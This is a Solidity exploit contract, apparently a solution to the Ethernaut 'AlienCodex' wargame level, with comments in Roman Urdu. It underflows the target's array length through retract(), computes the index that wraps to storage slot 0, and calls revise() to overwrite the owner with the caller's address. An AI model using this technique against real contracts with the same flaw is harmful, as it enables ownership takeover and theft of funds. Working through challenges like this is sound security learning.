// SPDX-License-Identifier: MIT
pragma solidity 0.5.17;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexAttack {
    
    function attack(address target) public {
        IAlienCodex alienContract = IAlienCodex(target);
        
        // 1. Pehle contact make karein taake contacted modifier pass ho jaye
        alienContract.makeContact();
        
        // 2. Array length ko underflow karwayein (0 - 1 = 2^256 - 1)
        alienContract.retract();
        
        // 3. Sahi index calculate karein jo Slot 0 (owner) ko target karega
        uint256 codexStartSlot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 ownerIndex = uint256(0) - codexStartSlot;
        
        // 4. Apne MetaMask wallet address ko bytes32 mein convert karein
        bytes32 myAddressUint256 = bytes32(uint256(uint160(msg.sender)));
        
        // 5. Revise call karke Slot 0 par apna address write kar dein
        alienContract.revise(ownerIndex, myAddressUint256);
    }
}
